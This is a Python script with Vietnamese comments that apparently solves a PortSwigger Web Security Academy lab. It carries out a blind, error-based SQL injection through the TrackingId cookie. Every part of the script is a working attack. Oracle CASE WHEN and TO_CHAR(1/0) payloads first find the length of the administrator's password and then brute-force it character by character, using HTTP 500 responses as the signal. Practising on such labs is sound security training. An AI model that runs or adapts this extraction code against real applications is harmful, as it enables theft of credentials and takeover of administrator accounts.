import requests

# Cấu hình URL và cookie session
BASE_URL = "https://0ae6001a036c4dc28002084c00be0080.web-security-academy.net"
TARGET_URL = BASE_URL + "/filter?category=Gifts"
SESSION_ID = "bEyxTDi8WRls3kiETMP2h6VStG93wJDI"

# Tập ký tự cần thử (có thể mở rộng nếu cần)
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"

# Hàm gửi request và kiểm tra xem server có trả lỗi 500 không
def is_condition_true(payload_tracking_id: str) -> bool:
    cookies = {
        "TrackingId": payload_tracking_id,
        "session": SESSION_ID
    }
    response = requests.get(TARGET_URL, cookies=cookies)
    return response.status_code == 500

# Bước 1: Tìm độ dài mật khẩu
def find_password_length(max_length: int = 50) -> int:
    print("[*] Finding password length...")
    for length in range(1, max_length + 1):
        payload = f"xyz'||(SELECT CASE WHEN LENGTH(password)>{length} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        if not is_condition_true(payload):
            print(f"[+] Password length found: {length}")
            return length
    raise Exception("[-] Password length not found in range!")

# Bước 2: Brute-force từng ký tự
def brute_force_password(length: int) -> str:
    print("[*] Starting password brute-force...")
    password = ""
    for i in range(1, length + 1):
        for ch in CHARSET:
            payload = f"xyz'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{ch}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            if is_condition_true(payload):
                password += ch
                print(f"[+] Found character {i}: {ch} → {password}")
                break
        else:
            print(f"[-] Could not find character at position {i}.")
            break
    return password

# Chạy toàn bộ
if __name__ == "__main__":
    try:
        pw_length = find_password_length()
        admin_password = brute_force_password(pw_length)
        print(f"\n[✓] Administrator password is: {admin_password}")
    except Exception as e:
        print(str(e))
